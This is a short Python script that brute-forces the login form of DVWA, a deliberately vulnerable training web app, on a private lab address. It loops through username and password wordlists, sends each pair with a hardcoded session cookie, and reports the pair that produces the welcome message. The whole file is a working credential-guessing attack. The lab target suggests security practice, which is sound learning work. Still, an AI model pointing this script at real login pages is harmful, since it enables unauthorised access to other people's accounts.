import requests
from bs4 import BeautifulSoup
import re
# i=['admin']
# j=['123456','qaxwd','password']
# url="http://192.168.102.140/DVWA-1.0.8/vulnerabilities/brute/?username={0}&password={1}&Login=Log".format(i[0],j[1])
# # print(url)
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': "gzip,deflate",
    'cookie': 'security=low; PHPSESSID=ithhgrmdpepocne3tvsc8pncp0'
}
# response = requests.get(url, headers=headers)
# #print(response.text)
# soup=BeautifulSoup(response.text,"lxml")
# print(soup)
# rt=soup.p.contents
#rd=soup.pre.contents[1]
# print(rt[0])
#print(rd)
with open("admin.txt",'r',encoding="utf-8") as fp1:
    if fp1 ==0:
        print("open file error")
    aa = fp1.read().splitlines()
    #print(aa)
with open("password.txt",'r') as fp2:
    if fp2==0:
        print("open file error")
    bb=fp2.read().splitlines()
    #print(bb)
for k in aa:
    for g in bb:
        url = "http://192.168.102.140/DVWA-1.0.8/vulnerabilities/brute/?username={0}&password={1}&Login=Log".format(k,g)
        print(url)
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, "lxml")
        #print(soup)
        rt = soup.p.contents[0] #提取密码成功时的lxml的元素值
        if (rt=="Welcome to the password protected area admin"):
            print("brute success,username  {0} and mima is {1}".format(k,g))
            break
